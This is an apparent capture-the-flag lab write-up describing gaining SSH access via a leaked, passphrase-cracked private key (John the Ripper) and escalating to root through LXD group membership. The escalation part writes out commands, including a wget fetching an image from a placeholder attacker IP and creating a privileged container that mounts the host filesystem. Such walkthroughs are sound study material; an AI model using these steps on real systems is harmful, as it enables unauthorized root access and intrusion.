# Objective

The goal of this lab is to obtain SSH access to the target machine by discovering a leaked **private SSH key**, cracking its passphrase, and then escalate privileges to **Root** by exploiting **LXD**.

---

# Initial Enumeration

We started by scanning the target using **Nmap**.

The scan revealed two open ports:

- SSH (22)
- HTTP (80)

![](Penetration%20Testing/Images/Pasted%20image%2020260705210557.png)

---

# Directory Enumeration

Next, we performed directory fuzzing using **Gobuster** to discover hidden pages.

During the scan, we found two interesting directories.

![](Penetration%20Testing/Images/Pasted%20image%2020260705210803.png)

---

# Discovering the Private SSH Key

We visited the **secret** page and discovered an encrypted **SSH private key**.

![](Penetration%20Testing/Images/Pasted%20image%2020260705210912.png)

We copied the private key so we could use it later for SSH authentication.

However, the key was protected with a passphrase, so we first needed to recover it.

---

# Cracking the SSH Key Passphrase

We converted the private key into a format that **John the Ripper** can crack using:

```bash
ssh2john
```

![](Penetration%20Testing/Images/Pasted%20image%2020260705211144.png)

After running John against the generated hash, we successfully recovered the passphrase.

![](Penetration%20Testing/Images/Pasted%20image%2020260705211324.png)

At this point we had:

- The SSH private key.
- The passphrase protecting it.

The only missing piece was the username.

---

# Finding the Username

We continued enumerating the web application and inspected the page source.

There we found the username.

![](Penetration%20Testing/Images/Pasted%20image%2020260705211431.png)

---

# SSH Login

Before using the private key, we changed its permissions.

![](Penetration%20Testing/Images/Pasted%20image%2020260705211523.png)

We then authenticated to the target over SSH using the discovered username, the private key, and its passphrase.

![](Penetration%20Testing/Images/Pasted%20image%2020260705211619.png)

After logging in, we successfully obtained the **user flag**.

![](Penetration%20Testing/Images/Pasted%20image%2020260705211644.png)

---

# Privilege Escalation

During the enumeration process, we noticed that the current user belonged to the **LXD** group.

![](Penetration%20Testing/Images/Pasted%20image%2020260705211743.png)

Membership in the **LXD** group is dangerous because it can allow a user to create privileged containers and mount the host filesystem, ultimately leading to **Root** access.

We searched for an LXD privilege escalation technique and followed the exploitation steps below.

---

# Building the Alpine image%20(Attacker Machine)

Clone the LXD Alpine builder project.

```bash
git clone https://github.com/saghul/lxd-alpine-builder.git
```

Move into the project directory.

```bash
cd lxd-alpine-builder
```

Build the Alpine image.

```bash
sudo ./build-alpine
```

---

# Hosting the Image

Serve the generated image%20over HTTP.

```bash
python3 -m http.server 8000
```

---

# Importing the image%20(Target Machine)

Download the image.

```bash
wget http://<attacker-ip>:8000/alpine-v3.10-x86_64-<timestamp>.tar.gz -P /tmp
```

Import it into LXD.

```bash
lxc image%20import /tmp/alpine-v3.10-x86_64-<timestamp>.tar.gz --alias alpine
```

Create a privileged container.

```bash
lxc init alpine exploit-container -c security.privileged=true
```

Mount the host filesystem inside the container.

```bash
lxc config device add exploit-container host-root disk source=/ path=/mnt/root recursive=true
```

Start the container.

```bash
lxc start exploit-container
```

Obtain a shell inside the container.

```bash
lxc exec exploit-container /bin/sh
```

---

# Accessing the Host Filesystem

Inside the container, navigate to the mounted host filesystem.

```bash
cd /mnt/root
```

Since the host filesystem is mounted inside the privileged container, we now have unrestricted access to the host files, including the Root user's files.

Read the root flag.

```bash
cat /root/flag.txt
```

As a result, we successfully obtained **Root** access.